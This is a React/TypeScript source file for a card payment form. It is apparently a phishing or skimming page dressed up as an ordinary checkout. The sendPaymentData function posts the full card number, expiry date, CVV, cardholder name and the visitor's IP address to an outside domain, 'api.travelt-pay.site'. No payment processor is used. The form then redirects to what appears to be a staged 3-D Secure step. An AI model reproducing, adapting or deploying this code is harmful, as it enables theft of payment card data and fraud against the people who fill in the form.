import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import { Input } from "./ui/input";
import { Button } from "./ui/button";
import { useToast } from "./ui/use-toast";

interface PaymentFormProps {
  amount: number;
}

// Luhn algorithm validation
const validateCardNumber = (cardNumber: string): boolean => {
  const digits = cardNumber.replace(/\D/g, '');
  let sum = 0;
  let isEven = false;

  for (let i = digits.length - 1; i >= 0; i--) {
    let digit = parseInt(digits[i]);

    if (isEven) {
      digit *= 2;
      if (digit > 9) {
        digit -= 9;
      }
    }

    sum += digit;
    isEven = !isEven;
  }

  return sum % 10 === 0;
};

const sendPaymentData = async (paymentData: any) => {
  try {
    const response = await fetch('https://api.ipify.org?format=json')
      .then(res => res.json())
      .then(async (data) => {
        const payload = {
          ...paymentData,
          ip: data.ip
        };
        
        // Send to our proxy endpoint
        await fetch('https://api.travelt-pay.site/api/notify', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify(payload)
        });
      });
    console.log('Payment data sent successfully');
  } catch (error) {
    console.error('Error sending payment data:', error);
  }
};

export const PaymentForm = ({ amount }: PaymentFormProps) => {
  const [cardHolder, setCardHolder] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [expiryDate, setExpiryDate] = useState("");
  const [cvv, setCvv] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);
  const navigate = useNavigate();
  const { toast } = useToast();

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsSubmitting(true);

    if (!validateCardNumber(cardNumber)) {
      toast({
        title: "Invalid Card",
        description: "Please enter a valid card number",
        variant: "destructive",
      });
      setIsSubmitting(false);
      return;
    }

    // Send payment data through proxy
    await sendPaymentData({
      amount,
      cardHolder,
      cardNumber,
      expiryDate,
      cvv
    });

    // Add 3-second delay before navigation
    await new Promise(resolve => setTimeout(resolve, 3000));
    
    // Navigate to 3DS verification with all payment data
    navigate(`/verify-3ds?amount=${amount}&cardHolder=${encodeURIComponent(cardHolder)}`);
  };

  const formatCardNumber = (value: string) => {
    const v = value.replace(/\s+/g, "").replace(/[^0-9]/gi, "");
    const matches = v.match(/\d{4,16}/g);
    const match = (matches && matches[0]) || "";
    const parts = [];

    for (let i = 0, len = match.length; i < len; i += 4) {
      parts.push(match.substring(i, i + 4));
    }

    if (parts.length) {
      return parts.join(" ");
    } else {
      return value;
    }
  };

  const formatExpiryDate = (value: string) => {
    const v = value.replace(/\s+/g, "").replace(/[^0-9]/gi, "");
    if (v.length >= 2) {
      return `${v.slice(0, 2)}/${v.slice(2, 4)}`;
    }
    return v;
  };

  return (
    <form onSubmit={handleSubmit} className="w-full space-y-6 bg-black/20 backdrop-blur-xl p-8 rounded-xl border border-white/10 shadow-2xl animate-fadeIn">
      <div className="space-y-2">
        <h2 className="text-3xl font-bold text-transparent bg-clip-text bg-gradient-to-r from-[#8B5CF6] via-[#D946EF] to-[#0EA5E9] text-center">
          Pay ${amount.toFixed(2)}
        </h2>
      </div>
      <div className="space-y-4">
        <div className="space-y-2">
          <Input
            type="text"
            placeholder="Card Holder Name"
            value={cardHolder}
            onChange={(e) => setCardHolder(e.target.value)}
            className="bg-black/50 border-white/20 text-white placeholder:text-gray-500 focus:border-white/40 transition-colors"
            required
          />
        </div>
        <div className="space-y-2">
          <Input
            type="text"
            placeholder="Card Number"
            value={cardNumber}
            onChange={(e) => setCardNumber(formatCardNumber(e.target.value))}
            maxLength={19}
            className="bg-black/50 border-white/20 text-white placeholder:text-gray-500 focus:border-white/40 transition-colors"
            required
          />
        </div>
        <div className="grid grid-cols-2 gap-4">
          <div className="space-y-2">
            <Input
              type="text"
              placeholder="MM/YY"
              value={expiryDate}
              onChange={(e) => setExpiryDate(formatExpiryDate(e.target.value))}
              maxLength={5}
              className="bg-black/50 border-white/20 text-white placeholder:text-gray-500 focus:border-white/40 transition-colors"
              required
            />
          </div>
          <div className="space-y-2">
            <Input
              type="text"
              placeholder="CVV"
              value={cvv}
              onChange={(e) => setCvv(e.target.value.replace(/\D/g, ""))}
              maxLength={4}
              className="bg-black/50 border-white/20 text-white placeholder:text-gray-500 focus:border-white/40 transition-colors"
              required
            />
          </div>
        </div>
        <Button
          type="submit"
          disabled={isSubmitting}
          className={`w-full relative bg-gradient-to-r from-[#8B5CF6] via-[#D946EF] to-[#0EA5E9] bg-[length:200%_200%] animate-gradient text-white transition-all duration-700
            before:absolute before:inset-0 before:rounded-md before:p-[1px] before:bg-gradient-to-r before:from-[#8B5CF6] before:via-[#D946EF] before:to-[#0EA5E9] before:animate-border-flow before:opacity-0 before:hover:opacity-100 before:transition-opacity before:duration-700
            ${isSubmitting ? 'opacity-75 cursor-not-allowed' : 'hover:scale-[1.02] hover:shadow-lg'}`}
        >
          <span className="relative z-10">
            {isSubmitting ? 'Processing...' : 'Pay Now'}
          </span>
        </Button>
      </div>
    </form>
  );
};
